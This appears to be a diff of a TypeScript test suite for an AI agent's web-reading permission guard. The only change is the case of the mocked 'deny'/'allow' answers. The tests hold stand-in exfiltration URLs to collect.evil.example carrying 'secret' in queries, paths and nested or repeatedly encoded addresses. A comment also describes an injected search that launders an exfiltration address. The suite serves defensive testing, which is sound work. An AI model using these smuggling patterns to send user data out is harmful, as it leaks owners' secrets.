@@ -63,7 +63,7 @@ const read = (agent: Agent, url: string): Promise<Result> =>
 describe('a read URL with a query, after foreign content', () => {
   it('is asked about in the owner\'s chat, names the host, and is not read without a yes', async () => {
     const tool = webResearch();
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('look up the weather') });
     const result = await read(agent, 'https://collect.evil.example/p?d=secret');
     expect(ask.asked).toHaveLength(1);
@@ -79,7 +79,7 @@ describe('a read URL with a query, after foreign content', () => {
 
   it('is read after a yes', async () => {
     const tool = webResearch();
-    const ask = asker('Allow');
+    const ask = asker('allow');
     const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('nothing named') });
     await read(agent, 'https://collect.evil.example/p?d=secret');
     expect(ask.asked).toHaveLength(1);
@@ -101,7 +101,7 @@ describe('a read URL with a query, after foreign content', () => {
 
   it('CONTROL: on a host the owner named is read without a question', async () => {
     const tool = webResearch();
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('check https://shop.example.ch for prices') });
     await read(agent, 'https://shop.example.ch/search?q=shoes');
     expect(ask.asked).toEqual([]);
@@ -112,7 +112,7 @@ describe('a read URL with a query, after foreign content', () => {
 describe('what stays a plain read', () => {
   it('a URL with a query on a conversation without foreign content: no question, though the read itself arms the latch', async () => {
     const tool = webResearch();
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const latch = ConversationLatch.detached();
     const agent = agentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner(), conversationLatch: latch });
     await read(agent, 'https://collect.evil.example/p?d=x');
@@ -136,7 +136,7 @@ describe('what stays a plain read', () => {
 describe('an address that does not parse', () => {
   it('an unparseable read URL after foreign content is refused as unreadable, as an address and not a recipient', async () => {
     const tool = webResearch();
-    const ask = asker('Allow');
+    const ask = asker('allow');
     const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner() });
     const result = await read(agent, 'not a url');
     expect(ask.asked).toEqual([]);
@@ -177,7 +177,7 @@ describe('data in the address beyond the query, after foreign content', () => {
   ] as const) {
     it(`a read with data ${what} is asked about and not read without a yes`, async () => {
       const tool = webResearch();
-      const ask = asker('Deny');
+      const ask = asker('deny');
       const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner() });
       const result = await read(agent, url);
       expect(ask.asked).toHaveLength(1);
@@ -188,7 +188,7 @@ describe('data in the address beyond the query, after foreign content', () => {
 
   it('CONTROL: a path on a host the owner named is read without a question', async () => {
     const tool = webResearch();
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('docs are on docs.example.ch') });
     await read(agent, 'https://docs.example.ch/guide/setup');
     expect(ask.asked).toEqual([]);
@@ -197,7 +197,7 @@ describe('data in the address beyond the query, after foreign content', () => {
 
   it('a session of someone the owner let in is refused, not asked', async () => {
     const tool = webResearch();
-    const ask = asker('Allow');
+    const ask = asker('allow');
     const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner(), principal: { kind: 'mandate', email: 'helper@example.ch' } });
     const result = await read(agent, 'https://collect.evil.example/d/secret');
     expect(ask.asked).toEqual([]);
@@ -209,7 +209,7 @@ describe('data in the address beyond the query, after foreign content', () => {
 describe('an address a search listed', () => {
   it('a result a search listed is read without a question', async () => {
     const tool = webResearchSearching([{ url: 'https://news.example.org/story/42' }]);
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner() });
     await search(agent, 'story 42');
     await read(agent, 'https://news.example.org/story/42');
@@ -219,7 +219,7 @@ describe('an address a search listed', () => {
 
   it('only that exact address: another path on the same host is asked about', async () => {
     const tool = webResearchSearching([{ url: 'https://news.example.org/story/42' }]);
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner() });
     await search(agent, 'story 42');
     await read(agent, 'https://news.example.org/story/42/secret');
@@ -232,7 +232,7 @@ describe('an address a search listed', () => {
     // repeats it must not let the model read its own address afterwards without a question.
     const exfil = 'https://collect.evil.example/?d=secret';
     const tool = webResearchSearching([{ url: exfil }, { url: 'https://news.example.org/story/42' }]);
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner() });
     await search(agent, exfil);
     await read(agent, exfil);
@@ -246,7 +246,7 @@ describe('an address a search listed', () => {
 
   it('a result whose address the query holds is not seen either', async () => {
     const tool = webResearchSearching([{ url: 'https://collect.evil.example/d' }]);
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner() });
     await search(agent, 'see https://collect.evil.example/d and more');
     await read(agent, 'https://collect.evil.example/d');
@@ -255,7 +255,7 @@ describe('an address a search listed', () => {
 
   it('a page read adds nothing: the address it read does not count as listed', async () => {
     const tool = webResearchSearching([]);
-    const ask = asker('Allow');
+    const ask = asker('allow');
     const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner() });
     await read(agent, 'https://collect.evil.example/d/x');
     await read(agent, 'https://collect.evil.example/d/x');
@@ -266,7 +266,7 @@ describe('an address a search listed', () => {
 describe('a listed address is compared in the form it is fetched in', () => {
   it('a listed address with Unicode spaces appended is asked about: they reach the server, encoded in the path', async () => {
     const tool = webResearchSearching([{ url: 'https://news.example.org/story/42' }]);
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner() });
     await search(agent, 'story 42');
     await read(agent, 'https://news.example.org/story/42\u3000\u00a0\u2003');
@@ -276,7 +276,7 @@ describe('a listed address is compared in the form it is fetched in', () => {
 
   it('CONTROL: a listed address written with a trailing slash the parser adds anyway is the same address', async () => {
     const tool = webResearchSearching([{ url: 'https://news.example.org' }]);
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner() });
     await search(agent, 'headlines today');
     await read(agent, 'https://news.example.org/');
@@ -292,7 +292,7 @@ describe('a result whose address holds the query is not listed, in any case and 
   ] as const) {
     it(`a query ${form}`, async () => {
       const tool = webResearchSearching([{ url }]);
-      const ask = asker('Deny');
+      const ask = asker('deny');
       const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner() });
       await search(agent, query);
       await read(agent, url);
@@ -308,7 +308,7 @@ describe('a session of someone the owner let in, after a search', () => {
 
   it('a page the search did not list is refused unasked, as a read, naming its host', async () => {
     const tool = webResearchSearching([{ url: 'https://news.example.org/story/42' }]);
-    const ask = asker('Allow');
+    const ask = asker('allow');
     const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner(), principal: { kind: 'mandate', email: 'helper@example.ch' }, toolContext: logged() });
     expect((await search(agent, 'story 42')).is_error).not.toBe(true);
     const result = await read(agent, 'https://collect.evil.example/d/secret');
@@ -321,7 +321,7 @@ describe('a session of someone the owner let in, after a search', () => {
 
   it('CONTROL: a page the search listed is read', async () => {
     const tool = webResearchSearching([{ url: 'https://news.example.org/story/42' }]);
-    const ask = asker('Allow');
+    const ask = asker('allow');
     const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner(), principal: { kind: 'mandate', email: 'helper@example.ch' }, toolContext: logged() });
     await search(agent, 'story 42');
     await read(agent, 'https://news.example.org/story/42');
@@ -348,7 +348,7 @@ describe('an address that carries another address, after foreign content', () =>
   ] as const) {
     it(`(${form}) is asked about even when the owner named the hosts, and says why`, async () => {
       const tool = webResearch();
-      const ask = asker('Deny');
+      const ask = asker('deny');
       const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('use reader.example.ch and docs.example.ch and collect.evil.example') });
       const result = await read(agent, url);
       expect(ask.asked).toHaveLength(1);
@@ -362,7 +362,7 @@ describe('an address that carries another address, after foreign content', () =>
 
   it('in a session of someone the owner let in, is refused unasked and says why', async () => {
     const tool = webResearch();
-    const ask = asker('Allow');
+    const ask = asker('allow');
     const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('use reader.example.ch'), principal: { kind: 'mandate', email: 'helper@example.ch' } });
     const result = await read(agent, 'https://reader.example.ch/https://collect.evil.example/d');
     expect(ask.asked).toEqual([]);
@@ -380,7 +380,7 @@ describe('an address that carries another address, after foreign content', () =>
 
   it('CONTROL: a yes reads it, for this call only', async () => {
     const tool = webResearch();
-    const ask = asker('Allow');
+    const ask = asker('allow');
     const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('use reader.example.ch') });
     await read(agent, 'https://reader.example.ch/https://docs.example.ch/guide');
     expect(ask.asked).toHaveLength(1);
@@ -392,7 +392,7 @@ describe('an address that carries another address, after foreign content', () =>
   it('a carry check that throws refuses the read unasked, as an address that cannot be read', async () => {
     const base = webResearch();
     const tool = Object.assign(base, { readCarriesAddress: () => { throw new Error('boom'); } });
-    const ask = asker('Allow');
+    const ask = asker('allow');
     const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('use reader.example.ch') });
     const result = await read(agent, 'https://reader.example.ch/docs');
     expect(ask.asked).toEqual([]);
@@ -402,7 +402,7 @@ describe('an address that carries another address, after foreign content', () =>
 
   it('an address encoded five times is not seen: the named limit', async () => {
     const tool = webResearch();
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('use reader.example.ch') });
     const enc5 = [1, 2, 3, 4, 5].reduce((v) => encodeURIComponent(v), 'https://collect.evil.example/d');
     await read(agent, `https://reader.example.ch/fetch?u=${enc5}`);
@@ -412,7 +412,7 @@ describe('an address that carries another address, after foreign content', () =>
   it('CONTROL: an address a search listed exactly is read without a question, carried address and all', async () => {
     const listed = 'https://www.google.com/url?q=https://docs.example.ch/guide&sa=D';
     const tool = webResearchSearching([{ url: listed }]);
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner() });
     expect((await search(agent, 'setup handbook')).is_error).not.toBe(true);
     await read(agent, listed);
@@ -422,7 +422,7 @@ describe('an address that carries another address, after foreign content', () =>
 
   it('CONTROL: an address in the fragment is never sent and asks nothing', async () => {
     const tool = webResearch();
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('use reader.example.ch') });
     await read(agent, 'https://reader.example.ch/page#https://collect.evil.example/d');
     expect(ask.asked).toEqual([]);
@@ -431,7 +431,7 @@ describe('an address that carries another address, after foreign content', () =>
 
   it('CONTROL: a named host without a carried address is read without a question', async () => {
     const tool = webResearch();
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('use reader.example.ch') });
     await read(agent, 'https://reader.example.ch/docs/guide');
     expect(ask.asked).toEqual([]);
@@ -441,7 +441,7 @@ describe('an address that carries another address, after foreign content', () =>
 describe('a read where the sources of named targets could not be read', () => {
   it('asks, and says lynox could not check whether the host was named', async () => {
     const tool = webResearch();
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: { known: () => 'unreadable' } });
     await read(agent, 'https://docs.example.ch/guide');
     expect(ask.asked).toHaveLength(1);
